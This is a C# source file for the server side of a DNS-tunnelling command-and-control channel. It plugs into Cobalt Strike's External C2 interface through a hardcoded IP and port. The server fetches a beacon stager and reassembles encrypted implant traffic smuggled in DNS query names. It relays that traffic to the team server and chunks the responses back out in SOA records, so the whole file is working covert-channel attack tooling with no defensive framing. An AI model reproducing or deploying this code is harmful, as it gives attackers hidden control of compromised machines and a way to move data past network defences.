using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ARSoft.Tools.Net.Dns;
using ARSoft.Tools.Net;
using System.Text;
using System.IO;

namespace Server
{
    class Program
    {
        static void Main(string[] args)
        {
            Options.c2ip = "1.15.54.117";
            Options.c2port = "60050";
            Options.socketC2 = new ExternalC2.SocketC2(Options.c2ip,Options.c2port);
            Options.socketC2.ServerChannel.Connect();
            byte[] stage = Options.socketC2.ServerChannel.GetStager(Options.pipeName, true, 500);
            var maxConnection = 1000;
            DnsServer dnsServer = new DnsServer(maxConnection, maxConnection);
            dnsServer.QueryReceived += DnsServer_QueryReceived;
            dnsServer.Start();
            Console.ReadKey();
        }
        /// <summary>
        /// 处理DNS请求
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="eventArgs"></param>
        /// <returns></returns>
        private static Task DnsServer_QueryReceived(object sender, QueryReceivedEventArgs eventArgs)
        {
            eventArgs.Query.IsQuery = false;
            DnsMessage query = eventArgs.Query as DnsMessage;
            //query.AnswerRecords.
            if (query == null || query.Questions.Count <= 0)
                query.ReturnCode = ReturnCode.ServerFailure;
            else
            {
                if (query.Questions[0].RecordType == RecordType.Soa)
                {

                    foreach (DnsQuestion dnsQuestion in query.Questions)
                    {
                        string domainName = dnsQuestion.Name.ToString().Remove(dnsQuestion.Name.ToString().Length - 1, 1);
                        string First_DomainName = domainName.Split('.')[0];  //获取第一个点分域名
                        
                        switch (First_DomainName)
                        {
                            case "md5":
                                {
                                    Options.md5 = domainName.Split('.')[1];  //获取要传回数据的md5值
                                    SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "dns", "aliyun" }), new DomainName(new String[] { "dns", "aliyun" }), 4, 4, 4, 4, 0);
                                    query.AnswerRecords.Add(soaRecord);
                                    break;
                                }
                            case "post":
                                {
                                    // 先发送到CS 获取返回 根据返回判断
                                    Console.WriteLine("收到post请求");
                                    SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "dns", "aliyun" }), new DomainName(new String[] { "dns", "aliyun" }), 4, 4, 4, 4, 0);
                                    query.AnswerRecords.Add(soaRecord);
                                    if (!Options.recDate.ContainsKey(int.Parse(domainName.Split('.')[1])))
                                    {
                                        Options.recDate.Add(int.Parse(domainName.Split('.')[1]), string.Join("", domainName.Split('.').ToList().GetRange(2, domainName.Split('.').Length-6).ToArray()));
                                    }
 
                                    if (Options.md5 == GetMD5Hash(string.Join("", Options.recDate.SelectMany(v => v.Value))))
                                    {
                                        byte[] data = Encryption.Decrypt(Encryption.HexStringToByteArray(string.Join("", Options.recDate.SelectMany(v => v.Value).ToArray())));
                                        Console.WriteLine("接收到的pipe读取长度 " + data.Length.ToString());
                                        if (!Options.socketC2.ServerChannel.Connected)
                                        {
                                            Options.socketC2.ServerChannel.Connect();
                                    
                                        }
                                        Options.socketC2.ServerChannel.SendFrame(data);
                                        byte[] recvData = Options.socketC2.ServerChannel.ReadFrame();
                                        Console.WriteLine("接收到CS的返回长度  " + recvData.Length.ToString());
                                        // 处理要返回给CLIENT的数据
                                        List<string> temp = Encryption.SplitLength(recvData);
                                        int length = temp.Count() / 3;
                                        int mod = temp.Count() % 3;
                                        int requestCount = 0;
                                        for (int i = 0; i < length; i++)
                                        {
                                            var l = temp.GetRange(i * 3, 3);
                                            string str = "";
                                            foreach (string s in l)
                                            {
                                                str += (s + ".");
                                            }
                                            Options.sendPayload.Add(requestCount, str.Trim('.'));
                                            requestCount += 1;
                                        }
                                        if (mod != 0)
                                        {
                                            string str = "";
                                            foreach (string a in temp.GetRange(length * 3, mod))
                                            {
                                                str += a + ".";
                                            }
                                            Options.sendPayload.Add(requestCount, str.Trim('.'));
                                        }
                                        Options.SN = (uint)Options.sendPayload.Count();
                                    }
                                    break;
                                }
                            case "get":
                                {
                                    // Console.WriteLine("要返回的数据 " + string.Join("", Options.sendPayload));
                                    Console.WriteLine("收到get请求");
                                    int number = int.Parse(domainName.Split('.')[1]);// 处理来请求数据的DNS请求
                                    Console.WriteLine("当前get请求序号   " + number.ToString());
                                    // 没执行下面的语句
                                    Console.WriteLine("get返回数据 " + string.Join("", Options.sendPayload[number].Split('.')) + "   " + "键值是  " + number.ToString());
                                    SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] {"data"}), new DomainName(Options.sendPayload[number].Split('.')), (uint)number, 4, 4, 4, 0);
                                    Console.WriteLine(soaRecord.ToString());
                                    query.AnswerRecords.Add(soaRecord);
                                    break;
                                }
                            case "reccount":
                                {
                                    Console.WriteLine("收到reccount请求，需要请求的次数   " + Options.SN.ToString());
                                    SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "reccount"}), new DomainName(new String[] { "dns", "aliyun" }), Options.SN, 4, 4, 4, 0);
                                    query.AnswerRecords.Add(soaRecord);//返回需要执行请求多少次
                                    break;
                                }

                            case "clear":
                                {
                                    Console.WriteLine("收到clear请求");
                                    Options.sendDate.Clear();
                                    Options.sendPayload.Clear();
                                    Options.recDate.Clear();
                                    SoaRecord soaRecord = new SoaRecord(dnsQuestion.Name, 137, new DomainName(new String[] { "clear" }), new DomainName(new String[] { "dns", "aliyun" }), 4, 4, 4, 4, 0);
                                    query.AnswerRecords.Add(soaRecord);//返回需要执行请求多少次
                                    break;
                                }

                        }
                        eventArgs.Response = eventArgs.Query;
                    }
                }
            }
            return Task.FromResult(0);
        }

        public static string GetMD5Hash(string bytedata)
        {
            try
            {
                System.Security.Cryptography.MD5 md5 = new System.Security.Cryptography.MD5CryptoServiceProvider();
                byte[] retVal = md5.ComputeHash(Encoding.UTF8.GetBytes(bytedata));
                StringBuilder sBuilder = new StringBuilder();

                // 循环遍历哈希数据的每一个字节并格式化为十六进制字符串
                for (int i = 0; i < retVal.Length; i++)
                {
                    sBuilder.Append(retVal[i].ToString("x2"));
                }
                //Console.WriteLine(sBuilder.ToString());
                return sBuilder.ToString();
            }
            catch (Exception ex)
            {
                throw new Exception("GetMD5Hash() fail,error:" + ex.Message);
            }

        }

    }
}
